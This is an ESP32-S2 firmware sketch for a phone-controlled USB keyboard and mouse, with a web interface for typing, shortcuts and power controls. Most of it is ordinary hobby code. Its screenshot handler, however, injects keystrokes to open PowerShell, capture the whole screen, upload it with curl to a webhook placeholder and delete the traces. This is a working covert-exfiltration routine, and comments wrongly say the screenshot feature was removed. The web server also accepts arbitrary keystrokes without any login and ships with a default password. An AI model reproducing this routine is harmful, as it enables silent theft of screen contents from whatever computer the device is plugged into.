/*
 * ESP32-S2 Wireless Computer Remote Controller
 * 
 * This project creates a modern USB HID device (keyboard/mouse) that can be controlled
 * remotely from your phone via WiFi web interface with advanced features including
 * power controls and modern UI design.
 * 
 * IMPORTANT: Make sure your board is set to ESP32-S2 and USB CDC is enabled!
 * 
 * Board Settings Required:
 * - Board: ESP32S2 Dev Module (or your specific ESP32-S2 board)
 * - USB CDC On Boot: Enabled
 * - Upload Mode: Internal USB (if available)
 * 
 * Hardware: ESP32-S2 (with native USB support)
 * Author: Made by Jasa Petek
 * Hackster.io: https://www.hackster.io/petekjasa
 * LinkedIn: https://www.linkedin.com/in/ja%C5%A1a-petek-2504ba387/
 */

#include <WiFi.h>
#include <WebServer.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"

// WiFi credentials for Access Point mode
const char* ssid = "WirelessRemote-ESP32";
const char* password = "RemoteControl123";  // Change this password!

// Create objects
WebServer server(80);
USBHIDKeyboard Keyboard;
USBHIDMouse Mouse;

// Security settings
unsigned long lastCommand = 0;
const unsigned long COMMAND_COOLDOWN = 100; // Minimum time between commands (ms)
bool deviceEnabled = true;

// Function declarations
bool checkSecurity();
void handleRoot();
void handleStatus();
void handleToggle();
void handleSendText();
void handleKeyCommand(uint8_t key);
void handleCtrlC();
void handleCtrlV();
void handleCtrlZ();
void handleAltTab();
void handleLeftClick();
void handleRightClick();
void handleDoubleClick();
void handleScrollUp();
void handleScrollDown();
void handleMouseMove(int8_t deltaX, int8_t deltaY);
void handleShowDesktop();
void handleTaskManager();
void handleRunDialog();
void handleScreenshot();
void typeStringSlow(const char* s, uint16_t delayMs = 5);
void handleShutdown();
void handleRestart();
void handleLockComputer();
void handleSleep();
void handleWakeUp();

// Modern HTML web page for phone control
const char* htmlPage = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wireless Computer Remote</title>
    <style>
        :root {
            --primary: #6366f1;
            --secondary: #8b5cf6;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --dark: #1f2937;
            --light: #f9fafb;
            --card-bg: rgba(255, 255, 255, 0.95);
            --text-primary: #1f2937;
            --text-secondary: #6b7280;
            --border: rgba(0, 0, 0, 0.1);
            --shadow: rgba(0, 0, 0, 0.1);
        }

        [data-theme="dark"] {
            --card-bg: rgba(31, 41, 55, 0.95);
            --text-primary: #f9fafb;
            --text-secondary: #d1d5db;
            --border: rgba(255, 255, 255, 0.1);
            --shadow: rgba(0, 0, 0, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            min-height: 100vh;
            color: var(--text-primary);
            padding: 16px;
            transition: all 0.3s ease;
        }

        [data-theme="dark"] body {
            background: linear-gradient(135deg, #1e293b, #334155);
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding-bottom: 100px;
        }

        .header {
            text-align: center;
            margin-bottom: 24px;
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            border: 1px solid var(--border);
            box-shadow: 0 4px 20px var(--shadow);
        }

        .header h1 {
            font-size: 1.75rem;
            font-weight: 700;
            margin-bottom: 16px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 16px;
            border-radius: 12px;
            font-weight: 500;
            margin-bottom: 16px;
            transition: all 0.3s ease;
        }

        .status.enabled {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
            border: 1px solid rgba(16, 185, 129, 0.2);
        }

        .status.disabled {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: currentColor;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .header-controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-top: 16px;
        }

        .theme-toggle {
            background: var(--secondary);
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            min-height: 48px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .theme-toggle:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 16px;
            border: 1px solid var(--border);
            transition: all 0.3s ease;
            box-shadow: 0 2px 15px var(--shadow);
        }

        .card:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px var(--shadow);
        }

        .card h3 {
            font-size: 1.125rem;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text-primary);
        }

        .button-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 12px;
        }

        .button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            min-height: 48px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .button:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .button:active {
            transform: translateY(0);
        }

        .button.secondary {
            background: var(--text-secondary);
        }

        .button.success {
            background: var(--success);
        }

        .button.warning {
            background: var(--warning);
        }

        .button.danger {
            background: var(--danger);
        }

        .button.mouse {
            background: #2563eb;
        }

        .button.sleep {
            background: #7c3aed;
        }

        .button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .text-input {
            width: 100%;
            padding: 16px;
            border: 1px solid var(--border);
            border-radius: 12px;
            background: var(--card-bg);
            color: var(--text-primary);
            font-size: 16px;
            margin-bottom: 16px;
            transition: all 0.3s ease;
        }

        .text-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .mouse-pad {
            background: rgba(0, 0, 0, 0.05);
            border-radius: 16px;
            padding: 20px;
            margin: 16px 0;
            text-align: center;
        }

        [data-theme="dark"] .mouse-pad {
            background: rgba(255, 255, 255, 0.05);
        }

        .mouse-controls {
            display: grid;
            grid-template-columns: 1fr auto 1fr;
            grid-template-rows: auto auto auto;
            gap: 8px;
            max-width: 200px;
            margin: 0 auto;
        }

        .mouse-controls .button {
            min-height: 40px;
            font-size: 12px;
        }

        .footer {
            text-align: center;
            padding: 20px;
            color: rgba(255, 255, 255, 0.8);
            font-size: 14px;
        }

        .footer a {
            color: rgba(255, 255, 255, 0.9);
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .footer a:hover {
            text-decoration: underline;
            color: white;
        }

        .confirmation-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .confirmation-dialog {
            background: var(--card-bg);
            border-radius: 20px;
            padding: 24px;
            margin: 20px;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        }

        .dialog-buttons {
            display: flex;
            gap: 12px;
            margin-top: 16px;
        }

        .power-warning {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            border-radius: 12px;
            padding: 12px;
            margin: 16px 0;
            color: var(--danger);
            font-size: 14px;
        }
    </style>
</head>
<body data-theme="light">
    <div class="container">
        <div class="header">
            <h1>Wireless Computer Remote</h1>
            <div id="status" class="status enabled">
                <span class="status-dot"></span>
                Device Connected
            </div>
            <div class="header-controls">
                <button class="button" onclick="toggleDevice()">Toggle Device</button>
                <button class="theme-toggle" onclick="toggleTheme()">
                    <span id="themeIcon">🌙</span> Theme
                </button>
            </div>
        </div>

        <!-- Text Input Section -->
        <div class="card">
            <h3>📝 Text Input</h3>
            <input type="text" id="textInput" class="text-input" placeholder="Type text to send to computer..." maxlength="100">
            <div class="button-grid">
                <button class="button" onclick="sendText()">Send Text</button>
                <button class="button secondary" onclick="sendKey('enter')">Enter</button>
                <button class="button secondary" onclick="sendKey('space')">Space</button>
                <button class="button secondary" onclick="sendKey('backspace')">Backspace</button>
            </div>
        </div>

        <!-- Keyboard Shortcuts -->
        <div class="card">
            <h3>⌨️ Keyboard Shortcuts</h3>
            <div class="button-grid">
                <button class="button" onclick="sendKey('ctrl_c')">Ctrl+C</button>
                <button class="button" onclick="sendKey('ctrl_v')">Ctrl+V</button>
                <button class="button" onclick="sendKey('ctrl_z')">Ctrl+Z</button>
                <button class="button" onclick="sendKey('alt_tab')">Alt+Tab</button>
            </div>
        </div>

        <!-- Mouse Controls -->
        <div class="card">
            <h3>🖱️ Mouse Controls</h3>
            <div class="button-grid">
                <button class="button mouse" onclick="mouseAction('left_click')">Left Click</button>
                <button class="button mouse" onclick="mouseAction('right_click')">Right Click</button>
                <button class="button mouse" onclick="mouseAction('double_click')">Double Click</button>
                <button class="button mouse" onclick="mouseAction('scroll_up')">Scroll Up</button>
                <button class="button mouse" onclick="mouseAction('scroll_down')">Scroll Down</button>
            </div>

            <div class="mouse-pad">
                <div class="mouse-controls">
                    <div></div>
                    <button class="button mouse" onclick="mouseMove('up')">↑</button>
                    <div></div>
                    <button class="button mouse" onclick="mouseMove('left')">←</button>
                    <div style="display: flex; align-items: center; justify-content: center; font-size: 12px; color: var(--text-secondary);">Move</div>
                    <button class="button mouse" onclick="mouseMove('right')">→</button>
                    <div></div>
                    <button class="button mouse" onclick="mouseMove('down')">↓</button>
                    <div></div>
                </div>
            </div>
        </div>

        <!-- System Actions -->
        <div class="card">
            <h3>💻 System Actions</h3>
            <div class="button-grid">
                <button class="button" onclick="systemAction('desktop')">🏠 Show Desktop</button>
                <button class="button" onclick="systemAction('taskmanager')">📊 Task Manager</button>
                <button class="button" onclick="systemAction('run')">🏃 Run Dialog</button>
                <button class="button" onclick="systemAction('screenshot')">📸 Screenshot</button>
            </div>
        </div>

        <!-- Power Controls -->
        <div class="card">
            <h3>⚡ Power Controls</h3>
            <div class="power-warning">
                ⚠️ Warning: Power controls will affect your computer immediately!
            </div>
            <div class="button-grid">
                <button class="button danger" onclick="confirmAction('shutdown', 'Shutdown Computer')">🔴 Shutdown</button>
                <button class="button warning" onclick="confirmAction('restart', 'Restart Computer')">🔄 Restart</button>
                <button class="button warning" onclick="confirmAction('lock', 'Lock Computer')">🔒 Lock Computer</button>
                <button class="button sleep" onclick="confirmAction('sleep', 'Sleep Computer')">😴 Sleep</button>
                <button class="button success" onclick="confirmAction('wake', 'Wake Computer')">⚡ Wake Up (BETA)</button>
            </div>
        </div>

        <div class="footer">
            <p>Made by: <strong>Jasa Petek</strong></p>
            <p>
                <a href="https://www.hackster.io/petekjasa" target="_blank">Hackster.io</a> | 
                <a href="https://www.linkedin.com/in/ja%C5%A1a-petek-2504ba387/" target="_blank">LinkedIn</a>
            </p>
        </div>
    </div>

    <!-- Confirmation Modal -->
    <div id="confirmationModal" class="confirmation-modal">
        <div class="confirmation-dialog">
            <h3 id="confirmTitle">Confirm Action</h3>
            <p id="confirmMessage">Are you sure you want to proceed?</p>
            <div class="dialog-buttons">
                <button class="button danger" onclick="executeConfirmedAction()">Yes, Proceed</button>
                <button class="button secondary" onclick="closeConfirmation()">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        let deviceEnabled = true;
        let pendingAction = null;

        // Theme management
        function toggleTheme() {
            const body = document.body;
            const themeIcon = document.getElementById('themeIcon');
            const currentTheme = body.getAttribute('data-theme');
            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';

            body.setAttribute('data-theme', newTheme);
            themeIcon.textContent = newTheme === 'dark' ? '☀️' : '🌙';
            localStorage.setItem('theme', newTheme);

            // Add smooth transition effect
            body.style.transition = 'all 0.3s ease';
            setTimeout(() => {
                body.style.transition = '';
            }, 300);
        }

        // Load saved theme
        function initTheme() {
            const savedTheme = localStorage.getItem('theme') || 'light';
            document.body.setAttribute('data-theme', savedTheme);
            document.getElementById('themeIcon').textContent = savedTheme === 'dark' ? '☀️' : '🌙';
        }

        // Command functions
        async function sendCommand(endpoint, data = null) {
            try {
                const options = {
                    method: data ? 'POST' : 'GET',
                    headers: data ? {'Content-Type': 'application/x-www-form-urlencoded'} : {},
                    body: data
                };

                const response = await fetch(endpoint, options);
                const result = await response.text();
                console.log('Command result:', result);
                return result;
            } catch (error) {
                console.error('Command failed:', error);
                alert('Command failed. Check connection.');
                return null;
            }
        }

        function sendText() {
            const text = document.getElementById('textInput').value;
            if (!text.trim()) {
                alert('Please enter some text first!');
                return;
            }
            if (text.length > 100) {
                alert('Text too long! Maximum 100 characters.');
                return;
            }

            sendCommand('/send_text', 'text=' + encodeURIComponent(text));
            document.getElementById('textInput').value = '';
        }

        function sendKey(key) {
            sendCommand('/key/' + key);
        }

        function mouseAction(action) {
            sendCommand('/mouse/' + action);
        }

        function mouseMove(direction) {
            sendCommand('/mouse/move_' + direction);
        }

        function systemAction(action) {
            sendCommand('/action/' + action);
        }

        function toggleDevice() {
            sendCommand('/toggle').then(result => {
                if (result) {
                    updateStatus();
                }
            });
        }

        function updateStatus() {
            sendCommand('/status').then(result => {
                const statusDiv = document.getElementById('status');
                if (result && result.includes('enabled')) {
                    statusDiv.className = 'status enabled';
                    statusDiv.innerHTML = '<span class="status-dot"></span>Device Connected';
                    deviceEnabled = true;
                } else {
                    statusDiv.className = 'status disabled';
                    statusDiv.innerHTML = '<span class="status-dot"></span>Device Disconnected';
                    deviceEnabled = false;
                }
            });
        }

        // Confirmation dialog
        function confirmAction(action, title) {
            pendingAction = action;
            document.getElementById('confirmTitle').textContent = title;

            let message = 'Are you sure you want to ' + title.toLowerCase() + '?';
            if (action === 'shutdown' || action === 'restart') {
                message += '\n\nThis will immediately affect your computer!';
            } else if (action === 'sleep') {
                message += '\n\nYour computer will enter sleep mode.';
            } else if (action === 'wake') {
                message += '\n\nThis will attempt to wake your computer.';
            }

            document.getElementById('confirmMessage').textContent = message;
            document.getElementById('confirmationModal').style.display = 'flex';
        }

        function executeConfirmedAction() {
            if (pendingAction) {
                sendCommand('/power/' + pendingAction);
                pendingAction = null;
            }
            closeConfirmation();
        }

        function closeConfirmation() {
            document.getElementById('confirmationModal').style.display = 'none';
            pendingAction = null;
        }

        // Initialize theme and auto-update status
        initTheme();
        setInterval(updateStatus, 10000);

        // Enter key support for text input
        document.getElementById('textInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendText();
            }
        });
    </script>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    Serial.println("Starting Wireless Computer Remote Controller...");

    // Initialize USB HID - CORRECTED ORDER
    USB.begin();
    Keyboard.begin();
    Mouse.begin();

    delay(1000); // Give USB time to initialize

    // Set up WiFi Access Point
    Serial.print("Setting up Access Point...");
    WiFi.softAP(ssid, password);

    IPAddress IP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(IP);

    // Web server routes
    server.on("/", handleRoot);
    server.on("/status", handleStatus);
    server.on("/toggle", handleToggle);

    // Keyboard routes
    server.on("/send_text", HTTP_POST, handleSendText);
    server.on("/key/enter", []() { handleKeyCommand(KEY_RETURN); });
    server.on("/key/space", []() { handleKeyCommand(' '); });
    server.on("/key/backspace", []() { handleKeyCommand(KEY_BACKSPACE); });
    server.on("/key/ctrl_c", handleCtrlC);
    server.on("/key/ctrl_v", handleCtrlV);
    server.on("/key/ctrl_z", handleCtrlZ);
    server.on("/key/alt_tab", handleAltTab);

    // Mouse routes
    server.on("/mouse/left_click", handleLeftClick);
    server.on("/mouse/right_click", handleRightClick);
    server.on("/mouse/double_click", handleDoubleClick);
    server.on("/mouse/scroll_up", handleScrollUp);
    server.on("/mouse/scroll_down", handleScrollDown);
    server.on("/mouse/move_up", []() { handleMouseMove(0, -20); });
    server.on("/mouse/move_down", []() { handleMouseMove(0, 20); });
    server.on("/mouse/move_left", []() { handleMouseMove(-20, 0); });
    server.on("/mouse/move_right", []() { handleMouseMove(20, 0); });

    // System action routes (screenshot removed)
    server.on("/action/desktop", handleShowDesktop);
    server.on("/action/taskmanager", handleTaskManager);
    server.on("/action/run", handleRunDialog);
    server.on("/action/screenshot", handleScreenshot);

    // Power control routes
    server.on("/power/shutdown", handleShutdown);
    server.on("/power/restart", handleRestart);
    server.on("/power/lock", handleLockComputer);
    server.on("/power/sleep", handleSleep);
    server.on("/power/wake", handleWakeUp);

    // Start server
    server.begin();
    Serial.println("HTTP server started");
    Serial.println("Connect to WiFi: " + String(ssid));
    Serial.println("Password: " + String(password));
    Serial.println("Then go to: http://" + IP.toString());
}

void loop() {
    server.handleClient();
    delay(10);
}

// Security check function
bool checkSecurity() {
    unsigned long currentTime = millis();
    if (currentTime - lastCommand < COMMAND_COOLDOWN) {
        return false; // Too fast, reject
    }
    lastCommand = currentTime;
    return deviceEnabled;
}

// Web page handlers
void handleRoot() {
    server.send(200, "text/html", htmlPage);
}

void handleStatus() {
    String status = deviceEnabled ? "enabled" : "disabled";
    server.send(200, "text/plain", status);
}

void handleToggle() {
    deviceEnabled = !deviceEnabled;
    String message = deviceEnabled ? "Device enabled" : "Device disabled";
    server.send(200, "text/plain", message);
    Serial.println(message);
}

void handleSendText() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    if (server.hasArg("text")) {
        String text = server.arg("text");
        Serial.println("Sending text: " + text);

        // Send each character
        for (int i = 0; i < text.length(); i++) {
            Keyboard.write(text.charAt(i));
            delay(50); // Small delay between characters
        }

        server.send(200, "text/plain", "Text sent: " + text);
    } else {
        server.send(400, "text/plain", "No text provided");
    }
}

// Keyboard command handlers
void handleKeyCommand(uint8_t key) {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.write(key);
    server.send(200, "text/plain", "Key sent");
}

void handleCtrlC() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('c');
    delay(100);
    Keyboard.releaseAll();
    server.send(200, "text/plain", "Ctrl+C sent");
}

void handleCtrlV() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('v');
    delay(100);
    Keyboard.releaseAll();
    server.send(200, "text/plain", "Ctrl+V sent");
}

void handleCtrlZ() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('z');
    delay(100);
    Keyboard.releaseAll();
    server.send(200, "text/plain", "Ctrl+Z sent");
}

void handleAltTab() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_TAB);
    delay(100);
    Keyboard.releaseAll();
    server.send(200, "text/plain", "Alt+Tab sent");
}

// Mouse command handlers
void handleLeftClick() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Mouse.click(MOUSE_LEFT);
    server.send(200, "text/plain", "Left click sent");
}

void handleRightClick() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Mouse.click(MOUSE_RIGHT);
    server.send(200, "text/plain", "Right click sent");
}

void handleDoubleClick() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Mouse.click(MOUSE_LEFT);
    delay(50);
    Mouse.click(MOUSE_LEFT);
    server.send(200, "text/plain", "Double click sent");
}

void handleScrollUp() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Mouse.move(0, 0, 1);
    server.send(200, "text/plain", "Scroll up sent");
}

void handleScrollDown() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Mouse.move(0, 0, -1);
    server.send(200, "text/plain", "Scroll down sent");
}

void handleMouseMove(int8_t deltaX, int8_t deltaY) {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Mouse.move(deltaX, deltaY);
    server.send(200, "text/plain", "Mouse moved");
}

// System action handlers (screenshot removed)
void handleShowDesktop() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.press(KEY_LEFT_GUI);   // Windows key
    Keyboard.press('d');
    delay(100);
    Keyboard.releaseAll();
    server.send(200, "text/plain", "Show desktop sent");
}

void handleTaskManager() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_ESC);
    delay(100);
    Keyboard.releaseAll();
    server.send(200, "text/plain", "Task manager opened");
}

void handleRunDialog() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    Keyboard.press(KEY_LEFT_GUI);   // Windows key
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    server.send(200, "text/plain", "Run dialog opened");
}

// Power control handlers
void handleShutdown() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    // Alternative shutdown method
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    delay(500);
    Keyboard.releaseAll();

    delay(1000); // Wait for shutdown dialog

    // Press U for shutdown (or Enter if already selected)
    Keyboard.press('u');
    delay(100);
    Keyboard.releaseAll();

    delay(500);

    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    server.send(200, "text/plain", "Shutdown command sent");
}

void handleRestart() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    // Alternative restart method
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    delay(500);
    Keyboard.releaseAll();

    delay(1000); // Wait for shutdown dialog

    // Press R for restart
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();

    delay(500);

    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    server.send(200, "text/plain", "Restart command sent");
}

void handleLockComputer() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    // Windows lock screen
    Keyboard.press(KEY_LEFT_GUI);   // Windows key
    Keyboard.press('l');
    delay(100);
    Keyboard.releaseAll();

    server.send(200, "text/plain", "Computer locked");
}

void handleSleep() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    // Windows sleep command
    Keyboard.press(KEY_LEFT_GUI);   // Windows key
    Keyboard.press('r');
    delay(500);
    Keyboard.releaseAll();

    delay(1000); // Wait for Run dialog to open

    // Type sleep command
    Keyboard.print("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
    delay(500);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    server.send(200, "text/plain", "Sleep command sent");
}

void handleWakeUp() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    // Simulate key presses to wake up computer
    // Most computers wake up from mouse movement or key presses
    Mouse.move(1, 1);
    delay(100);
    Mouse.move(-1, -1);
    delay(100);

    // Also try space key
    Keyboard.write(' ');
    delay(100);

    // Try mouse click
    Mouse.click(MOUSE_LEFT);

    server.send(200, "text/plain", "Wake up signals sent");
}
// Helper: types a full string reliably with slight pacing
void typeStringSlow(const char* s, uint16_t delayMs) {
  while (*s) {
    Keyboard.write(*s++);
    delay(delayMs);
  }
}

void handleScreenshot() {
    if (!checkSecurity()) {
        server.send(429, "text/plain", "Rate limited or device disabled");
        return;
    }

    // Step 1: Open Run dialog and launch PowerShell
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    typeStringSlow("powershell", 20);
    delay(100);

    Keyboard.press(KEY_RETURN);
    delay(50);
    Keyboard.releaseAll();
    delay(2000); // Wait for PowerShell to open

    // Step 2: Screenshot
    typeStringSlow("$path = \"$env:TEMP\\screenshot.png\"", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("Add-Type -AssemblyName System.Windows.Forms", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("Add-Type -AssemblyName System.Drawing", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$bmp = New-Object Drawing.Bitmap([Windows.Forms.SystemInformation]::VirtualScreen.Width, [Windows.Forms.SystemInformation]::VirtualScreen.Height)", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$g = [Drawing.Graphics]::FromImage($bmp)", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$g.CopyFromScreen([Windows.Forms.SystemInformation]::VirtualScreen.Location, [Drawing.Point]::Empty, $bmp.Size)", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$bmp.Save($path)", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$bmp.Dispose()", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$g.Dispose()", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    // Step 3: Create temporary JSON payload file
    typeStringSlow("$payloadFile = \"$env:TEMP\\payload.json\"", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$payload = '{\"content\":\"Screenshot\"}'", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("$payload | Out-File -Encoding ascii $payloadFile", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    // Step 4: Upload screenshot with payload file
    typeStringSlow("& curl.exe -F \"file=@$path\" -F \"payload_json=@$payloadFile\"YOUR WEBHOOK HERE", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(3000);

    // Step 5: Delete temp files
    typeStringSlow("Remove-Item $path -Force", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    typeStringSlow("Remove-Item $payloadFile -Force", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(100);

    // Step 6: Close PowerShell
    typeStringSlow("exit", 20);
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll();

    server.send(200, "text/plain", "Screenshot uploaded to Discord");
}